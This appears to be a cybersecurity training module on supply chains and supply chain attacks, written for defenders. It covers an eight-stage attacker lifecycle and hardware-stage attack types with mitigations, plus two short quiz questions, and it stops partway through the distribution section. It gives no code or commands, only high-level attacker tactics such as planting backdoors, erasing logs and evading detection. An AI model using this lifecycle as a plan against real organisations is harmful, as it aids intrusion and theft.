# Introduction to Supply Chains

* * *

`Supply chains` are crucial in the global economic framework, embodying the procedures and organisations accountable for producing, distributing, and providing goods and services. Given the `interwoven character` of global trade, comprehending supply chains is essential for `contemporary businesses`.

## What is a Supply Chain

A `supply chain` refers to the sequence of processes and entities involved in producing and distributing goods, from raw material sourcing to delivering the final product to the end user.

It is a system of organisations, people, activities, information, and resources that move a product or service from `supplier` to `customer`.

![](https://academy.hackthebox.com/storage/modules/243/Diagram_LifecycleSupply-Chains_02_B.png)

Here's a breakdown of the key components and stages in a traditional supply chain:

1. `Raw Material Suppliers`: This is the starting point of the supply chain. Raw materials, whether natural resources like `minerals` and `timber` or primary agricultural products like `cotton` or `grain`, are extracted, harvested, or otherwise procured.
2. `Manufacturers`: The raw materials are sent to manufacturers who transform them into finished goods or components. Manufacturing can be a multi-stage process, with raw materials being turned into intermediate goods, which are then used to produce finished goods.
3. `Storage and Distribution`: This covers the storage and movement of goods post-manufacture. `Warehouses` are vital in holding goods before dispatch, catering to order requirements and balancing supply during demand fluctuations. Concurrently, distribution encompasses the transfer of goods between various points, such as from manufacturers to distributors or distributors to retailers. `Distributors` are pivotal in acquiring products from manufacturers, storing them in warehouses, and ensuring delivery to retailers or the final consumers.
4. `Retailers`: Retailers are businesses that sell products directly to consumers. They can range from large `departmental stores` to small `corner shops`. Retailers buy products from manufacturers or distributors and then sell them to the end-users.
5. `Customers/End Users`: These consumers buy and use the final product. They are the reason the entire supply chain exists: to fulfil their needs and demands.

## Hardware Supply Chains

The principles of a `supply chain` described above set the stage for understanding the more specific `hardware supply chain`. While the traditional supply chain encompasses a wide range of products and services, the hardware supply chain zeroes in on the production and distribution of tangible, physical goods. These goods are often more complex, requiring an intricate network of suppliers and manufacturers.

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Hardware-Supply-Chains-01_B.png)

1. `Raw Material Extraction`: Unlike general supply chains, here, the focus is on specific `metals` and `non-metallic minerals` crucial for electronics and machinery.
2. `Component Manufacturing`: This involves specialised manufacturing of `semiconductors`, `microchips`, and other crucial components like `screens`, `batteries`, and `casings`.
3. `Assembly`: Complex products are assembled, often integrating `automated machinery` and `manual labour`, and may include installing `basic software` or `firmware`.
4. `Quality Control and Testing`: More rigorous than in general supply chains, involving `stress tests` and `performance evaluations`.
5. `Packaging`: Tailored for protecting and presenting hardware products, including `user manuals` and `accessories`.
6. `Distribution and Logistics`: Involves extensive global networks, often more complex due to the delicate nature of electronic products.
7. `Retail and Sales`: Products reach consumers through diverse channels like `brick-and-mortar stores` and `online retailers`.

The `hardware supply chain` extends the basic model by incorporating these additional layers of complexity and specialisation, particularly in areas like `raw material extraction` and `component manufacturing`. As we delve into the hardware supply chain, we encounter additional challenges and stages specific to electronics and machinery production. This includes the intricate process of creating `semiconductors` and `microchips`, which are fundamental to modern technology.

## Software Supply Chains

Just as we extended the `supply chain` concept to cover the complexities of `hardware supply chains`, a similar extension applies to `software supply chains`. In contrast to physical goods, software supply chains revolve around `creating`, `integrating`, `testing`, and `distributing ` digital products—software applications and systems.

This digital nature introduces unique stages and components, reflecting the non-tangible yet critically important aspects of software development and distribution.

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Software-Supply-Chains_03_B.png)

1. `Development`:
   - Specialised tools and platforms such as `Integrated Development Environments (IDEs)`, `compilers`, and `debuggers` are employed, contrasting with physical tooling in traditional supply chains.
   - The human element, consisting of `software engineers` and `developers`, is pivotal, akin to workers in a manufacturing plant but with an emphasis on intellectual and creative output.
   - `Dependencies` and `Libraries` serve a role similar to raw materials in manufacturing, offering pre-built functionalities.
   - `Version Control Systems` are distinct to software, managing code alterations and collaboration, a process not present in traditional supply chains.
2. `Build and Integration`: Processes such as `Continuous Integration (CI)` and `Continuous Delivery (CD)` are exclusive to software, ensuring efficient integration and delivery of code contributions.

3. `Testing`: Various testing stages, including `unit testing` and `user acceptance testing`, are vital for assuring software quality, paralleling quality control in manufacturing but customised for digital products.

4. `Deployment`: Deploying software to `servers` or `cloud platforms` represents a unique phase, markedly different from the logistical challenges of distributing physical goods.

5. `Distribution`: Software is disseminated to users through avenues such as direct downloads, software repositories, and app stores, contrasting with the physical distribution networks of hardware.


## The Impact and Importance of Supply Chains

`Supply chains` are the `backbone` of our global economy, dictating how goods and services are produced, distributed, and consumed worldwide. Their `complexity` and `significance` have grown exponentially with `globalisation`, `technological advancements`, and the demands of an `ever-increasing global population`.

### Economic Impact

`Supply chains`, often perceived as mere mechanisms for moving goods and services, are `pivotal` in shaping a nation's economic landscape. Their `profound impact` on various economic dimensions is `multifaceted` and `wide-ranging`.

The most direct impact of supply chains on the economy is their contribution to the `Gross Domestic Product (GDP)`. Every supply chain step, from raw material extraction to manufacturing to retailing, adds value to a product. This `cumulative value addition` contributes significantly to the GDP. Industries that are integral parts of the supply chain, such as manufacturing, logistics, and retail, are major `pillars` of most economies.

Supply chains are `massive employment generators`. They create jobs at every stage, from manual labourers in mines or farms to skilled factory workers, logistics personnel, and retail employees. These jobs span various skill sets, educational backgrounds, and experience levels. The `cascading effect` of this is significant: when workers spend their earnings, they stimulate other sectors of the economy, leading to even more economic activity and job creation.

Efficient supply chains `bolster` a nation's trading capabilities. Countries with robust and agile supply chains can export goods more competitively, creating a favourable trade balance. A `positive trade balance` can strengthen a nation's currency, enhance creditworthiness, and attract foreign investment.

They can also reduce the costs associated with producing and delivering goods. These savings often translate to `lower prices` for consumers. On the flip side, disruptions or inefficiencies in the supply chain can lead to increased costs, which might be passed on to consumers through `higher prices`.

### Business Competitiveness

For businesses, `supply chains` are crucial for maintaining `competitiveness`. Efficient supply chains allow companies to achieve `cost efficiencies` through optimised logistics, reduced inventory holding costs, or well-negotiated supplier contracts.

They also play a pivotal role in ensuring `customer satisfaction` by ensuring products are available when and where they are wanted, enhancing customer loyalty. Moreover, supply chains enable `rapid innovation`, allowing businesses to swiftly introduce new products to the market, responding to changing consumer demands or technological shifts.

### Social Impact

The `social ramifications` of supply chains are vast. They directly affect the standard of living, with efficient chains leading to a broader availability of goods at more `affordable prices`.

The global nature of supply chains also fosters `cultural exchange`, introducing products from different parts of the world and promoting intercultural understanding. Additionally, supply chains can `empower local communities`, especially when businesses prioritise ethical sourcing and fair trade practices.

### Environmental Impact

Supply chains have a marked impact on the `environment`. They dictate the rate of `natural resource consumption`, from the raw materials extracted to the energy expended in manufacturing and transportation.

Supply chains' emissions, pollution, and waste can also have significant `environmental consequences`. However, modern supply chains increasingly focus on `sustainability`, with many companies adopting environmentally friendly practices.

### Global Interconnectedness

Supply chains exemplify `global interconnectedness`. They are susceptible to disruptions from geopolitical tensions, natural disasters, or other unforeseen events. The recent pandemic underscored the `vulnerabilities` inherent in many global supply chains.

However, these chains foster `partnerships` between nations, industries, and companies. Such relationships often lead to collaborations in other domains, from technology exchanges to research initiatives. Diversified supply chains can also offer `economic resilience`, helping nations and businesses weather economic downturns more effectively.

### Technological Impact

`Technology` is reshaping supply chains. They are at the forefront of `digital transformation`, integrating advancements like the Internet of Things (IoT) and artificial intelligence.

When analysed, the vast data generated by modern supply chains offers `insights` that can drive efficiency and predict trends. `Automation` and `robotics`, from automated warehouses to drone deliveries, also make supply chains more efficient and responsive.


# Supply Chain Attacks

* * *

Before delving into the specifics of `Supply Chain Attacks`, linking this concept to our prior discussions on traditional `hardware` and `software` supply chains is essential. Traditionally, supply chains refer to the complex production, handling, and distribution networks that deliver products or services from suppliers to consumers. In `Cybersecurity`, understanding these supply chains is crucial, as they form the backbone of our `digital infrastructure`.

A `Supply Chain Attack` occurs when a cyber attacker infiltrates a system through vulnerabilities in the supply chain. This method of attack is particularly insidious because it targets less secure elements in the supply chain to compromise the end product or service. These attacks can occur in various forms, from tampering with physical `hardware` components to inserting malicious code into `software` updates.

## Why are Supply Chain Attacks so High Impact?

`Supply Chain Attacks` uniquely exploit the interconnected and dependent nature of modern supply chains.

Traditional supply chains involving the production and distribution of `hardware` and `software` are inherently complex and involve multiple stakeholders. An attack on any single entity within this chain can have a cascading effect, impacting all downstream users.

`This interconnectedness means a vulnerability in a small, seemingly insignificant supplier can lead to widespread compromises`. The amplified impact of these attacks highlights the inherent risks in the globalised supply chains we discussed earlier.

The foundation of traditional supply chains is based on trust between suppliers, manufacturers, and customers. `Supply Chain Attacks` directly target this trust.

When a supplier is compromised, it affects their direct customers and casts a shadow of doubt across the entire supply chain network. This erosion of trust can lead to hesitancy in adopting new technologies and sharing critical information, which is crucial for the efficient functioning of traditional supply chains.

Critical infrastructure sectors, deeply integrated with traditional supply chains, are particularly vulnerable to these attacks. These sectors depend on many suppliers for their `hardware` and `software` needs.

A breach in any part of the supply chain can have far-reaching consequences, impacting essential services and causing significant disruptions. This vulnerability underscores the importance of securing the end product and each component and process within the traditional supply chain.

The complexity and global nature of modern supply chains provide multiple points of entry for attackers. In traditional supply chains, products often traverse various geographical and corporate boundaries before reaching the end user. Each handover point introduces potential vulnerabilities that attackers can exploit. The challenge is that a single compromised element, even at an early stage of the supply chain, can affect the entire system’s integrity.

Cyber attackers continuously adapt and evolve their methods to exploit vulnerabilities in supply chains. They now target finished products and the components and processes involved in creating these products. For instance, injecting malware into a commonly used `software library` can affect every product that relies on that library. This evolution of attack strategies poses a continuous and dynamic threat to traditional supply chains, requiring constant vigilance and adaptation from all parties involved.


# Lifecycle of a Supply Chain Attack

* * *

The threat landscape in cybersecurity is constantly evolving, with supply chain attacks becoming a significant concern for organisations globally. This section delves into the intricate `Lifecycle of a Supply Chain Attack`, comprehensively examining each stage.

Understanding this lifecycle is critical for cybersecurity professionals who aim to protect their systems and mitigate risks associated with these sophisticated attacks.

We'll explore the goals and objectives attackers set, their challenges, and the considerations they must account for at each phase. Through this structured approach, we aim to arm you with the knowledge to anticipate better and counter such threats.

![](https://academy.hackthebox.com/storage/modules/243/AttackLifeCycle.png)

## 1\. Target Identification

Before executing a supply chain attack, an attacker must identify a `primary target`. This target is usually an organisation, entity, or system with valuable assets or strategic advantages.

The value of the target can be in various forms: financial data, intellectual property, user information, or even simply the capability to disrupt critical infrastructures. Sometimes, the target may not be the end goal but a `stepping stone` to a more valuable objective.

### Goals & Objectives

- `Determine the Value`: The primary goal at this stage is to identify organisations with `assets` worth exploiting. This could be tangible assets like `financial data` or intangible ones like `reputation`. For instance, attacking a well-respected organisation can have a ripple effect, causing distrust in the wider `industry` or `community`.
- `Assess Direct Attack Feasibility`: The attacker will evaluate how difficult it would be to breach the target directly. This involves assessing the target's `security measures`, their `response capabilities`, and any other barriers to entry. If the attacker deems a direct attack too risky or challenging, they may look for alternative entry methods, leading them to consider a `supply chain attack`.
- `Understand the Ecosystem`: To evaluate the viability of a `supply chain attack`, the attacker needs to understand the target's `ecosystem`. This involves researching the various entities the target interacts with, the nature of these interactions, and the potential vulnerabilities these relationships might introduce.

### Challenges & Considerations

While the `target identification` stage might seem straightforward, it often requires a lot of research and intelligence gathering. Sophisticated attackers may use a combination of `open-source intelligence (OSINT)`, `social engineering`, and even `preliminary cyber reconnaissance` to gather as much information as possible about their desired target.

Additionally, attackers need to weigh the `potential rewards` against the `risks`. A `high-profile target` may promise significant rewards, but it also comes with increased scrutiny and the potential for severe consequences if caught.

## 2\. Supply Chain Exploration

Once the `primary target` is identified and a direct attack is deemed too challenging, the attacker shifts focus to the target's `supply chain`. This stage is crucial because, in a supply chain attack, the ultimate goal is to exploit `vulnerabilities` within the interconnected web of `suppliers`, `partners`, and other `third-party entities` associated with the main target.

These third parties often have `less robust security measures` than the primary target, making them a more attractive entry point.

### Goals & Objectives

- `Map the Ecosystem`: The attacker aims to map out the target's `supply chain` comprehensively. This involves understanding which `third-party` entities have a relationship with the target, the nature of their interactions, and their relative importance. For instance, a `supplier` providing critical `software components` may be more valuable than a vendor supplying `office supplies`.
- `Identify Potential Weak Links`: Not all `third parties` are created equal. Some may have weaker `security postures`, `outdated systems`, or fewer resources dedicated to `cybersecurity`. Identifying these weak links provides the attacker with potential points of entry.
- `Determine Access Levels`: Some `third parties` might have more extensive access to the target's systems and `data` than others. Understanding the access level of each third party can help the attacker prioritise which entities to exploit.

### Challenges & Considerations

The `interconnected nature` of modern supply chains means that dozens or even hundreds of `third parties` could be associated with a target. Sifting through these entities to identify the `most vulnerable and valuable ones` requires significant research and analysis.

Moreover, while third parties might have weaker security in some cases, they are not always easy to exploit. Some may have `unique security measures` or their relationship with the main target might be structured to `limit exposure`.

Another crucial consideration is `stealth`. While exploring the supply chain, the attacker must remain undetected. Any premature exposure can alert the target or the third party, leading to increased scrutiny and potentially thwarting the attack before it gains traction.

![](https://academy.hackthebox.com/storage/modules/243/AttackLifeCycle_3_4.png)

## 3\. Vulnerability Discovery

With the target's `supply chain` mapped and potential `weak links` identified, attackers focus on finding specific `vulnerabilities` within these entities.

`Vulnerabilities` span a broad spectrum, from `software and hardware flaws` to `human errors` and `procedural gaps`. Exploiting these vulnerabilities will give the attacker an `initial foothold`, the launching pad for their attack on the `primary target`.

### Goals & Objectives

- `Technical Vulnerability Scanning`: The attacker employs various `tools` and `techniques` to scan the third-party systems for known `vulnerabilities`. This could be outdated software, unpatched systems, or configuration flaws.
- `Human Factor Exploration`: Recognizing that humans are often the weakest link in `security`, attackers might engage in `social engineering` tactics, like `phishing` or `baiting`, to manipulate individuals into compromising security inadvertently.
- `Process and Procedural Gaps`: Attackers may also look for procedural weaknesses beyond technical and human vulnerabilities. This could be lax `security protocols`, inadequate `access controls`, or even gaps in the `physical security` measures of a facility.
- `Custom Exploit Development`: If known vulnerabilities are not identified or are insufficient for the attacker's purposes, they might develop custom `exploits` tailored to the specific systems and configurations of the third party.

### Challenges & Considerations

Identifying `vulnerabilities`, especially those not widely known ( `zero-days`), requires a deep understanding of various systems, software, and security practices. Attackers might need to invest significant resources in this phase, including `specialised tools` and `expertise`.

Another challenge is the `dynamic nature` of security landscapes. As vulnerabilities are discovered and patched regularly, the `window of opportunity` for exploitation might be limited. This requires attackers to act swiftly once a vulnerability is identified.

Lastly, while finding a vulnerability might seem significant, its value is primarily determined by how it can be exploited and what `access` or `control` it grants the attacker. A vulnerability that doesn't provide meaningful access or control may not be worth exploiting.

## 4\. Initial Exploitation

Having identified `vulnerabilities` in the supply chain, the attacker now moves to exploit these weaknesses. The initial `exploitation stage` involves leveraging the discovered vulnerabilities to gain `unauthorised access`, `control`, or `influence` over third-party systems. It's a pivotal moment in the supply chain attack as it transitions from planning and reconnaissance to `active intrusion`.

### Goals & Objectives

- `Gain Access`: The primary objective is to breach the third-party system, gaining unauthorised access. This could be achieved by exploiting `software vulnerabilities`, taking advantage of `misconfigurations`, or using `compromised credentials` obtained through `phishing` or other means.
- `Establish Foothold`: Once inside, the attacker seeks to solidify their presence. This may involve creating `backdoors`, escalating `privileges`, or installing `malware` for persistent access.
- `Avoid Detection`: Stealth is crucial. The attacker needs to ensure that their activities remain unnoticed. This might involve erasing logs, using `evasion techniques` to bypass security measures, or mimicking legitimate user behaviour.
- `Gather Information`: With access secured, the attacker might start to gather information from the third-party system, which can aid in the next stages of the attack. This could be data related to the primary target, additional `credentials`, `network topologies`, or other valuable insights.

### Challenges & Considerations

Exploiting a `vulnerability` is not always straightforward. Security measures, like `intrusion detection systems`, `firewalls`, and `anomaly detection tools`, can interfere with or detect exploitation attempts. The attacker must be well-prepared to handle these challenges and adapt their methods accordingly.

Additionally, there's always the risk of detection. Any misstep, like triggering alarms or causing noticeable disruptions, can alert the third party or the main target, jeopardising the entire operation.

![](https://academy.hackthebox.com/storage/modules/243/AttackLifeCycle_5_6.png)

## 5\. Lateral Movement

Having gained an `initial foothold` in the third-party system, the attacker now seeks to expand their influence and access.

`Lateral movement` involves navigating the compromised network hopping from one system or account to another to get closer to valuable assets or access points that lead to the primary target. It's a game of `exploration and stealth`, as the attacker aims to maximise their control while remaining undetected.

### Goals & Objectives

- `Expand Access`: The attacker works to access additional systems, servers, or accounts within the third-party network. This could involve exploiting further `vulnerabilities`, using `stolen credentials`, or leveraging the privileges of the initially compromised account.
- `Discover Valuable Assets`: The attacker seeks valuable assets as they navigate the network. This could be `sensitive data`, critical `infrastructure components`, or specific systems directly connected to the main target.
- `Identify Additional Vulnerabilities`: As the attacker explores, they may uncover additional vulnerabilities that can be exploited within the third-party network or potentially in the primary target's systems.
- `Maintain Stealth`: The attacker must operate under the radar throughout the lateral movement. This involves evading detection mechanisms, using `encrypted channels`, mimicking legitimate traffic, and regularly cleaning up traces of their activity.

### Challenges & Considerations

Lateral movement can be a `slow and meticulous process`. Networks can be vast and complex, and not every system or account will provide valuable access or information. The attacker must constantly weigh the `benefits` of accessing a system against the `risks` of detection.

Moreover, as they move laterally, they may encounter additional security barriers, such as `segmented networks`, `multi-factor authentication`, or `advanced monitoring tools`. Each can pose challenges and require the attacker to adapt their strategies.

It's also worth noting that while the attacker expands their access, they also increase their `exposure`. The more systems they touch and actions they take, the higher the chances of leaving behind evidence or triggering alarms.

## 6\. Target Compromise

With a solid `foothold` established within the third-party system and after successful `lateral movement`, the attacker is now poised to breach the `primary target`. This stage, the " `target compromise`," is the culmination of the previous efforts and marks the point where the attacker exploits the relationship between the third party and the main target to gain `unauthorised access`.

### Goals & Objectives

- `Leverage Third-Party Access`: Many third parties have legitimate access to the main target's systems, whether for maintenance, `data sharing`, or other collaborative activities. The attacker aims to exploit this trusted relationship as a bridge to the primary target.
- `Breach Main Target's Systems`: The core objective is to penetrate the defences of the main target. This could be achieved by sending `malicious payloads` disguised as legitimate files, exploiting interconnected systems' `vulnerabilities`, or using a third party's `stolen credentials`.
- `Establish Persistence`: Once inside the main target's network, the attacker seeks to ensure they can maintain access over time. This might involve creating `backdoors`, installing `rootkits`, or other `malware` that provides ongoing control.
- `Stay Undetected`: As always, stealth is paramount. The attacker takes measures to blend in, ensuring their malicious activities are masked and indistinguishable from regular, legitimate operations.

### Challenges & Considerations

The `primary target` might have sophisticated security measures in place, especially if it's a large or high-profile entity. These could include advanced `intrusion detection systems`, `behavioural analytics tools`, and rapid `incident response teams`. Breaching such a target requires `finesse` and `expertise`.

Furthermore, while the third-party relationship provides an avenue of attack, it can also be a `double-edged sword`. If the main target becomes suspicious of the third party's activities, they might sever connections or increase monitoring, thereby cutting off the attacker's access route.

Another significant consideration is the `magnitude of the compromise`. Breaching a primary target can have wide-ranging consequences for the target and its customers, partners, and the broader community. This can attract significant attention from `law enforcement` and the `cybersecurity community`.

![](https://academy.hackthebox.com/storage/modules/243/AttackLifeCycle_7_8.png)

## 7\. Data Exfiltration or Malicious Activity

With the successful `compromise` of the main target, the attacker now moves to the phase where they act on their `primary objectives`. Depending on the attacker's goals, this stage might involve `stealing sensitive data` ( `data exfiltration`), deploying `malicious payloads` like ransomware, `sabotaging operations`, or establishing `long-term surveillance mechanisms`.

### Goals & Objectives

- `Extract Valuable Data`: If the attacker's goal is financial gain or espionage, they might extract sensitive data from the target's systems. This could be `customer information`, `intellectual property`, `financial records`, or other value data.
- `Deploy Malware or Ransomware`: In some cases, the attacker might wish to disrupt operations. Deploying `ransomware` to encrypt critical files or launching other types of `malware` can serve this purpose, often leading to monetary demands or other extortion.
- `Sabotage Operations`: For attackers motivated by political, competitive, or ideological reasons, the objective might be to damage or disrupt the target's operations. This could involve altering data, shutting down key systems, or manipulating processes.
- `Surveillance and Monitoring`: Some attackers might be interested in long-term espionage. They can set up tools to monitor communications, track user activities, or continuously gather data over an extended period.
- `Maintain Stealth`: Throughout this phase, it's essential for the attacker to remain undetected. The longer they can operate without raising alarms, the more they can achieve. This requires careful management of `data transfer rates`, mimicking legitimate traffic, and regularly erasing traces of unauthorised activities.

### Challenges & Considerations

The process of `exfiltrating data` or conducting `malicious activities` can be risky. Large data transfers or noticeable disruptions can trigger `security alerts`. The attacker must be meticulous in ensuring their activities remain under the radar.

Furthermore, the data or access that the attacker has might be `encrypted` or `protected` in various ways, requiring additional efforts to `decrypt` or `unlock`.

## 8\. Evasion and Persistence

Having executed their `primary objectives`, attackers typically don't want to abandon their position hastily. The `evasion and persistence stage` centres on maintaining access to the `compromised systems` while evading detection. This allows the attacker to return for `future operations` potentially, continue `surveillance`, or ensure they leave no `trace behind` that could lead to their identification.

### Goals & Objectives

- `Create Backdoors`: The attacker might establish multiple `backdoors`, ensuring that if one access point is detected and closed, others remain operational. These backdoors can be complex, leveraging various techniques to remain hidden.
- `Erase Traces`: To avoid detection post-operation, attackers often clean up logs, delete temporary files, and remove any other evidence of their activities. This makes it harder for `forensic teams` to assemble the attack timeline and methodologies.
- `Deploy Persistence Mechanisms`: Tools like `rootkits` or certain types of `malware` can help the attacker maintain a presence on the compromised system, even if the system is rebooted or updated.
- `Adapt to Changing Environments`: As the target organisation updates software, changes configurations, or adds new security measures, the attacker adapts to ensure their persistence mechanisms remain functional and hidden.
- `Continue Monitoring`: Even after achieving their primary objectives, attackers might continue to monitor the compromised systems for new opportunities and valuable data or to keep tabs on the target's activities.

### Challenges & Considerations

Evasion and persistence can be a `cat-and-mouse game`, especially if the target organisation becomes aware of potential breaches and starts actively hunting for threats. Modern security tools, incorporating `artificial intelligence` and `behavioural analytics`, can detect anomalies or suspicious patterns, making the attacker's job more challenging.

Additionally, as `software updates` or systems are replaced, previously installed `backdoors` or `persistence mechanisms` might become non-functional or get detected. The attacker needs to be proactive in updating their tools and techniques.

Another vital consideration is the `risk of exposure`. The longer an attacker remains within a system, the more actions they undertake and the higher the chances of detection. It's a balance of `risk and reward`.

#### Optional Exercises

Challenge your understanding of the Module content and answer the optional
question(s) below. These are considered supplementary content and are not
required to complete the Module. You can reveal the answer at any time to check
your work.


What is the second phase of a supply chain attack?

Submit


Reveal Answer


Which phase in the lifecycle of a supply chain attack, involves moving from an initial foothold in a network, into another system?

Submit


Reveal Answer


# Hardware Supply Chain Attacks

* * *

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Hardware-Supply-Chains-01_B.png)

## Raw Material Extraction

`Raw material extraction` is the initial stage in the `hardware supply chain`, forming the cornerstone of all subsequent processes.

At this stage, the primary `vulnerabilities` stem from the extensive and variable nature of sourcing locations, making `oversight` a challenge. `Mines` and `extraction sites` are often situated in remote areas, subject to a spectrum of `regulation` and scrutiny.

### Types of Attacks

- `Sabotage` of mining equipment to disrupt the extraction process.
- Introduction of `impurities` into materials to degrade their quality.
- `Theft` of valuable raw materials from extraction sites.
- `Espionage` to acquire insights into the extraction process and sourcing strategies.

### Consequences

Interference at the `raw material extraction` stage can lead to widespread effects throughout the supply chain. Impure or compromised materials may diminish the quality of final `hardware products`, causing reduced lifespan, decreased performance, and heightened susceptibility to failure.

In scenarios where these materials are critical components of `safety-critical systems`, the risks intensify. Potential catastrophic failures can pose safety hazards and substantial financial losses.

Furthermore, if the extraction process is impeded or stopped, it can result in delays and escalated costs down the supply chain.

### Mitigation Strategies

- Implement comprehensive `security measures` at extraction sites, including surveillance systems and trained security personnel.
- Conduct regular audits and inspections of extraction processes and outputs to assure quality and purity.
- Cultivate `transparent relationships` with `local communities and authorities` to safeguard the safety and integrity of extraction sites.
- Employ advanced testing and verification methods to confirm the `quality of extracted materials` before incorporation into the manufacturing process.
- Establish `traceability protocols` to monitor the origin and journey of raw materials.

## Component Manufacturing

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Hardware-Supply-Chains-01_B_CM.png)

`Component manufacturing` is a critical phase in which raw materials are transformed into individual components that will be assembled into finished products. This process involves intricate machinery, specialised software, and a highly skilled workforce.

One of the most significant vulnerabilities in this stage is the `intellectual property` ( `IP`) related to design and manufacturing techniques. Given the high value of these assets, they are prime targets for malicious actors.

### Types of Attacks

- `Cyber espionage` is aimed at stealing IP related to component design and manufacturing techniques.
- `Physical theft` of prototypes or key components.
- `Sabotage ` of manufacturing equipment, leading to defects in produced components.
- Introduction of `malicious hardware modifications` or "hardware Trojans."
- `Infiltration` of the manufacturing workforce by malicious actors aiming to gather insider information or perform acts of sabotage.

### Consequences

Compromises at the component manufacturing stage can lead to a myriad of problems. Hardware tampered with or manufactured using stolen IP can have inherent vulnerabilities or defects.

When these components are integrated into larger systems, the system becomes susceptible to failures, malfunctions, or exploitations. In cases where compromised components find their way into critical infrastructure or sensitive applications, the stakes are even higher. There's a potential for data breaches, service interruptions, and even physical harm.

### Mitigation Strategies

- Implement rigorous cybersecurity measures to protect IP and manufacturing-related data.
- Conduct regular security audits and vulnerability assessments of manufacturing facilities.
- Use `hardware assurance techniques` to detect and prevent the introduction of malicious modifications during manufacturing.
- `Educate and train` the workforce about security best practices and the risks of insider threats.
- `Collaborate` with industry peers and governmental bodies to share information about emerging threats and best practices.

## Assembly

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Hardware-Supply-Chains-01_B_AP.png)

In the `assembly phase`, individual components come together to form a coherent whole, presenting a unique set of challenges. The convergence of multiple components, often sourced from various manufacturers, means the assembly process is a melting pot of potential issues.

A prime vulnerability arises from the sheer number of components and their diverse origins, making quality control and verification daunting.

### Types of Attacks

- Introduction of `counterfeit` or `substandard` components into the assembly line.
- `Tampering` with assembly machinery to introduce defects or alter device functionality.
- Alteration or replacement of `firmware` being installed on devices during assembly.
- Cyberattacks targeting `assembly line control systems`, potentially disrupting operations.
- Infiltration by insiders aiming to tamper with the assembly process.

### Consequences

The ramifications of compromises during the assembly phase are profound. Devices assembled with counterfeit or tampered components can be functionally deficient, leading to malfunctions or reduced lifespan.

Worse still, they might contain hidden backdoors or vulnerabilities that can be exploited once the device is used. For consumers, this means potential data breaches, privacy invasions, or even physical harm in the case of critical devices like medical equipment.

On the business side, recalls, legal actions, and loss of customer trust can severely impact profitability.

### Mitigation Strategies

- `Rigorous quality control measures` to ensure all components are genuine and meet the required standards.
- Implement cybersecurity measures to protect assembly line control systems and firmware installation processes.
- Regularly audit and inspect assembly processes and outputs for signs of tampering or interference.
- Use `tamper-evident packaging` or seals to ensure the integrity of assembled products.
- Educate and train assembly line workers about potential threats and encourage a `culture of vigilance and responsibility`.

## Quality Control and Testing

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Hardware-Supply-Chains-01_B_QC.png)

`Quality control and testing` are pivotal in ensuring that the hardware that is produced meets the requisite standards and functions as intended. However, these processes are not without their vulnerabilities.

There's a reliance on testing equipment and software, which, if compromised, can provide inaccurate results. Additionally, human oversight can introduce bias or errors, especially if testing procedures are not standardised or personnel are not adequately trained.

Given the high stakes, malicious actors might target this phase to ensure compromised devices pass muster and make their way to end-users.

### Types of Attacks

- Manipulation or tampering of testing equipment to produce false results.
- Cyberattacks on software used for `automated testing` lead to skewed or inaccurate outcomes.
- Introducing `compromised units` into batches of tested and approved devices.
- `Bribery` or `coercion` of quality control personnel to overlook defects or vulnerabilities.
- `Espionage` to gain insights into testing procedures and criteria.

### Consequences

The implications can be widespread and severe if the quality control and testing phase is compromised. Faulty or malicious hardware products that pass testing can be distributed widely, leading to potential malfunctions, system failures, or security breaches.

The ripple effects can be even more significant when these flawed products are integrated into larger systems or critical infrastructures. This can result in costly recalls and legal repercussions, and substantial business reputational damage.

On the other hand, consumers face risks ranging from data breaches to potential physical harm, depending on the nature of the compromised hardware.

### Mitigation Strategies

- `Continuously update` and `standardise testing procedures` to account for emerging threats and vulnerabilities.
- Implement robust cybersecurity measures to `safeguard testing equipment` and software.
- `Regularly calibrate` and verify the accuracy of testing equipment.
- Establish a secure and transparent `chain of custody` for hardware products throughout the testing phase.
- Educate and train quality control personnel on the latest threats and encourage a `culture of vigilance and ethical responsibility`.

## Packaging

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Hardware-Supply-Chains-01_B_P.png)

While `packaging` might seem straightforward and low-risk, it's riddled with potential vulnerabilities. Given its position in the supply chain, packaging is the last line of defence before products reach distribution channels and, eventually, consumers.

This stage is susceptible to both physical tampering and infiltration by malicious actors. The lack of continuous surveillance in some packaging facilities and the often repetitive process can lead to lapses in vigilance.

Furthermore, transitioning from a controlled manufacturing environment to packaging introduces additional points of potential compromise.

### Types of Attacks

- Replacement of genuine products with `counterfeit` or `tampered` versions during packaging.
- Insertion of `malicious software` or hardware components into the packaged products.
- `Alteration` of product labels or documentation to mislead end-users or distribution partners.
- `Tampering` with tamper-evident seals or packaging to hide signs of interference.

### Consequences

Breaches in the packaging phase can lead to consumers receiving counterfeit, tampered, or compromised devices. Such devices can malfunction, expose users to security vulnerabilities, or even harm them physically in some cases. When consumers can't trust the authenticity and integrity of products due to packaging compromises, brands can suffer severe reputational damage.

The economic implications of recalls, returns, and potential legal actions can also be hefty. Overall, the trust and reliability of the entire supply chain can be questioned if the integrity of the packaging process is compromised.

### Mitigation Strategies

- Implement rigorous security measures in packaging facilities, including surveillance systems, access controls, and regular security audits.
- Use advanced `tamper-evident packaging solutions` that provide clear indicators of any interference.
- Regularly train packaging staff on security best practices and vigilance during packaging.
- Establish strict protocols for the handling and moving of products within the packaging facility.
- Collaborate with industry peers to share information on emerging threats and best practices specific to packaging security.

## Distribution and Logistics

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Hardware-Supply-Chains-01_B_DN.png)

`Distribution and logistics` form the bridge between manufacturers and retailers or consumers. Given the vast geographical areas covered and the multiple hands through which products pass, this stage is fraught with vulnerabilities.

Warehouses, transport vehicles, and distribution hubs might lack the tight security controls in manufacturing environments. The decentralised nature of logistics and varying levels of oversight at different stages can create gaps that malicious actors can exploit.

### Types of Attacks

- `Interception` of shipments to steal, tamper with, or replace genuine products.
- `Cyberattacks` on logistics management systems, leading to misrouting or loss of shipments.
- `Physical breaches` of warehouses or storage facilities to access stored products.
- `Espionage` to gather intelligence on distribution routes, schedules, and security protocols.

### Consequences

Compromises in the distribution and logistics phase can lead to direct financial losses from theft or damage. Moreover, if tampered or counterfeit products reach retailers and consumers, there's a risk of malfunctions, data breaches, and other associated repercussions.

